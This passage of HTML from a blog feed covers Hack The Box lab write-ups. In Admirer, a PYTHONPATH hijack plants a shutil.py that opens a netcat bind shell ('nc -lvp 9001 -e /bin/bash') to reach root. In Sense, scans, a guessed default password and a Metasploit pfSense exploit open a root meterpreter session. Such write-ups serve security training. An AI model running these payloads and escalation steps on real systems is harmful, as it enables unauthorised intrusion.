</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">waldo@admirer:~$ sudo -l
<span style="color:#ff79c6">[</span>sudo<span style="color:#ff79c6">]</span> password <span style="color:#ff79c6">for</span> waldo:
Matching Defaults entries <span style="color:#ff79c6">for</span> waldo on admirer:
    env_reset, <span style="color:#8be9fd;font-style:italic">env_file</span><span style="color:#ff79c6">=</span>/etc/sudoenv, mail_badpass, <span style="color:#8be9fd;font-style:italic">secure_path</span><span style="color:#ff79c6">=</span>/usr/local/sbin<span style="color:#f1fa8c">\:</span>/usr/local/bin<span style="color:#f1fa8c">\:</span>/usr/sbin<span style="color:#f1fa8c">\:</span>/usr/bin<span style="color:#f1fa8c">\:</span>/sbin<span style="color:#f1fa8c">\:</span>/bin, <span style="color:#8be9fd;font-style:italic">listpw</span><span style="color:#ff79c6">=</span>always

User waldo may run the following commands on admirer:
    <span style="color:#ff79c6">(</span>ALL<span style="color:#ff79c6">)</span> SETENV: /opt/scripts/admin_tasks.sh
</code></pre></td></tr></table>
</div>
</div><p>We find an interesting function when we <code>cat /opt/scripts/admin_tasks.sh</code></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">backup_web()
{
    <span style="color:#ff79c6">if</span> [ <span style="color:#f1fa8c">&#34;$EUID&#34;</span> <span style="color:#ff79c6">-</span>eq <span style="color:#bd93f9">0</span> ]
    then
        echo <span style="color:#f1fa8c">&#34;Running backup script in the background, it might take a while...&#34;</span>
        <span style="color:#ff79c6">/</span>opt<span style="color:#ff79c6">/</span>scripts<span style="color:#ff79c6">/</span>backup<span style="color:#ff79c6">.</span>py <span style="color:#ff79c6">&amp;</span>
    <span style="color:#ff79c6">else</span>
        echo <span style="color:#f1fa8c">&#34;Insufficient privileges to perform the selected operation.&#34;</span>
    fi
}
</code></pre></td></tr></table>
</div>
</div><p>backup.py</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">from</span> shutil <span style="color:#ff79c6">import</span> make_archive
[<span style="color:#ff79c6">..</span>whatever<span style="color:#ff79c6">..</span>]
</code></pre></td></tr></table>
</div>
</div><p>While we can&rsquo;t edit the backup.py, we can still change the PYTHONPATH and edit our own shutil.py file :)</p>
<p>Modified /dev/shm/shutil.py</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">waldo@admirer:<span style="color:#ff79c6">~</span>$ cat <span style="color:#ff79c6">&lt;&lt;</span>EOF <span style="color:#ff79c6">&gt;</span> <span style="color:#ff79c6">/</span>dev<span style="color:#ff79c6">/</span>shm<span style="color:#ff79c6">/</span>shutil<span style="color:#ff79c6">.</span>py
<span style="color:#ff79c6">&gt;</span> <span style="color:#ff79c6">import</span> os
<span style="color:#ff79c6">&gt;</span> os<span style="color:#ff79c6">.</span>system(<span style="color:#f1fa8c">&#34;nc -lvp 9001 -e /bin/bash&#34;</span>)
<span style="color:#ff79c6">&gt;</span> EOF
</code></pre></td></tr></table>
</div>
</div><p>to preserve environment variable we use ths sudo -E option</p>
<pre tabindex="0"><code>-E, --preserve-env
	   Indicates to the security policy that the user wishes to preserve their existing environment variables.  The security
	   policy may return an error if the user does not have permission to preserve the environment.
</code></pre><p>We can use netcat command</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">waldo@admirer:/dev/shm$ sudo -E <span style="color:#8be9fd;font-style:italic">PYTHONPATH</span><span style="color:#ff79c6">=</span><span style="color:#ff79c6">$(</span><span style="color:#8be9fd;font-style:italic">pwd</span><span style="color:#ff79c6">)</span>  /opt/scripts/admin_tasks.sh <span style="color:#bd93f9">6</span>
Running backup script in the background, it might take a <span style="color:#ff79c6">while</span>...
waldo@admirer:/dev/shm$ listening on <span style="color:#ff79c6">[</span>any<span style="color:#ff79c6">]</span> <span style="color:#bd93f9">9001</span> ...
waldo@admirer:/dev/shm$ 10.10.14.6: inverse host lookup failed: Host name lookup failure
connect to <span style="color:#ff79c6">[</span>10.10.10.187<span style="color:#ff79c6">]</span> from <span style="color:#ff79c6">(</span>UNKNOWN<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>10.10.14.6<span style="color:#ff79c6">]</span> <span style="color:#bd93f9">60942</span>

──────────────────────────────────────────────────────────────────────────────────────────────────
$ rlwrap nc 10.10.10.187 <span style="color:#bd93f9">9001</span>
id
<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span>
<span style="color:#8be9fd;font-style:italic">pwd</span>
/dev/shm
cat /root/root.txt
<span style="color:#ff79c6">[</span>REDACTED<span style="color:#ff79c6">]</span>
</code></pre></td></tr></table>
</div>
</div>]]></content></item><item><title>HTB - Sense</title><link>https://0xade1.github.io/posts/2020/09/htb-sense/</link><pubDate>Tue, 22 Sep 2020 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2020/09/htb-sense/</guid><description>nmap 1 2 3 4 5 6 7 8 _ sense nmap -p- --min-rate=5000 -T4 10.10.10.60 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-20 20:06 HKT Nmap scan report for 10.10.10.60 Host is up (0.055s latency). Not shown: 65533 filtered ports PORT STATE SERVICE 80/tcp open http 443/tcp open https Website is pfsense login page
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 _ sense gobuster dir -k -u https://10.</description><content type="html"><![CDATA[<h1 id="nmap">nmap</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">_  sense nmap -p- --min-rate<span style="color:#ff79c6">=</span><span style="color:#bd93f9">5000</span> -T4 10.10.10.60
Starting Nmap 7.80 <span style="color:#ff79c6">(</span> https://nmap.org <span style="color:#ff79c6">)</span> at 2020-09-20 20:06 HKT
Nmap scan report <span style="color:#ff79c6">for</span> 10.10.10.60
Host is up <span style="color:#ff79c6">(</span>0.055s latency<span style="color:#ff79c6">)</span>.
Not shown: <span style="color:#bd93f9">65533</span> filtered ports
PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https
</code></pre></td></tr></table>
</div>
</div><p>Website is pfsense login page</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">_  sense   gobuster  dir -k -u https://10.10.10.60 -w /opt/dictionaries/directory-list-2.3-medium.txt -x txt,swp,log,xml,json -t <span style="color:#8be9fd;font-style:italic">50</span>
<span style="color:#ff79c6">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span style="color:#ff79c6">(</span>@TheColonial<span style="color:#ff79c6">)</span> &amp; Christian Mehlmauer <span style="color:#ff79c6">(</span>@_FireFart_<span style="color:#ff79c6">)</span>
<span style="color:#ff79c6">===============================================================</span>
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Url:            https://10.10.10.60
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Threads:        <span style="color:#bd93f9">50</span>
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Wordlist:       /opt/dictionaries/directory-list-2.3-medium.txt
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Status codes:   200,204,301,302,307,401,403
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> User Agent:     gobuster/3.0.1
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Extensions:     txt,swp,log,xml,json
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Timeout:        <span style="color:#8be9fd;font-style:italic">10s</span>
<span style="color:#ff79c6">===============================================================</span>
2020/09/20 20:31:51 Starting <span style="color:#8be9fd;font-style:italic">gobuster</span>
<span style="color:#ff79c6">===============================================================</span>
/themes <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
/css <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
/includes <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
/javascript <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
/changelog.txt <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span>
/classes <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
/widgets <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
/tree <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
/shortcuts <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
/installer <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
/wizards <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
/csrf <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
/system-users.txt <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span>
/filebrowser <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
</code></pre></td></tr></table>
</div>
</div><p>Found changelog.txt which informs us of a missing vulnerability patch</p>
<p>Found system-users.txt which contains username rohit with a note about default password</p>
<p>What defaut password could this be? let&rsquo;s try: sense, pfsense, etc &hellip;</p>
<p>that works with rohit:pfsense, we could login and see which version of pfsense:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Version 	2.1.3-RELEASE (amd64)
built on Thu May 01 15:52:13 EDT 2014
FreeBSD 8.3-RELEASE-p16
</code></pre></td></tr></table>
</div>
</div><p><a href="https://www.cvedetails.com/vulnerability-list/vendor_id-11749/product_id-21763/Pfsense-Pfsense.html">Vulnerability list</a> for PFsense reveals <a href="https://www.cvedetails.com/cve/CVE-2016-10709/">CVE-2016-10709</a> is a good candidate for the missing vulnerability; and it has an exploit available (exploitdb and metasploit):</p>
<ul>
<li><a href="https://www.exploit-db.com/exploits/39709/">https://www.exploit-db.com/exploits/39709/</a></li>
<li><a href="https://www.rapid7.com/db/modules/exploit/unix/http/pfsense_graph_injection_exec">https://www.rapid7.com/db/modules/exploit/unix/http/pfsense_graph_injection_exec</a> (ranked excellent)</li>
</ul>
<h1 id="metasploit">Metasploit</h1>
<p>got the shell</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf6 &gt; use exploit/unix/http/pfsense_graph_injection_exec
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Using configured payload php/meterpreter/reverse_tcp
msf6 exploit<span style="color:#ff79c6">(</span>unix/http/pfsense_graph_injection_exec<span style="color:#ff79c6">)</span> &gt; info
msf6 exploit<span style="color:#ff79c6">(</span>unix/http/pfsense_graph_injection_exec<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> rhosts 10.10.10.60
<span style="color:#8be9fd;font-style:italic">rhosts</span> <span style="color:#ff79c6">=</span>&gt; 10.10.10.60
msf6 exploit<span style="color:#ff79c6">(</span>unix/http/pfsense_graph_injection_exec<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> username rohit
<span style="color:#8be9fd;font-style:italic">username</span> <span style="color:#ff79c6">=</span>&gt; rohit
msf6 exploit<span style="color:#ff79c6">(</span>unix/http/pfsense_graph_injection_exec<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> lhost 10.10.14.38
<span style="color:#8be9fd;font-style:italic">lhost</span> <span style="color:#ff79c6">=</span>&gt; 10.10.14.38
msf6 exploit<span style="color:#ff79c6">(</span>unix/http/pfsense_graph_injection_exec<span style="color:#ff79c6">)</span> &gt; run

<span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> Handler failed to <span style="color:#8be9fd;font-style:italic">bind</span> to 10.10.14.38:4444:-  -
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Started reverse TCP handler on 0.0.0.0:4444
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Detected pfSense 2.1.3-RELEASE, uploading intial payload
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Payload uploaded successfully, executing
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Sending stage <span style="color:#ff79c6">(</span><span style="color:#bd93f9">39264</span> bytes<span style="color:#ff79c6">)</span> to 172.17.0.1
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Meterpreter session <span style="color:#bd93f9">1</span> opened <span style="color:#ff79c6">(</span>172.17.0.2:4444 -&gt; 172.17.0.1:39110<span style="color:#ff79c6">)</span> at 2020-09-20 13:14:27 +0000
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Deleted gdZ

meterpreter &gt;
</code></pre></td></tr></table>
</div>
</div><p>We collect flags</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; getuid
Server username: root <span style="color:#ff79c6">(</span>0<span style="color:#ff79c6">)</span>
meterpreter &gt; cat /home/rohit/user.txt
<span style="color:#ff79c6">[</span>REDACTED<span style="color:#ff79c6">]</span>
meterpreter &gt; cat /root/root.txt
<span style="color:#ff79c6">[</span>REDACTED<span style="color:#ff79c6">]</span>
</code></pre></td></tr></table>
</div>
</div><h1 id="without-metasploit">Without metasploit</h1>
<h2 id="exploitdb-43560">exploitdb 43560</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span></code></pre></td>
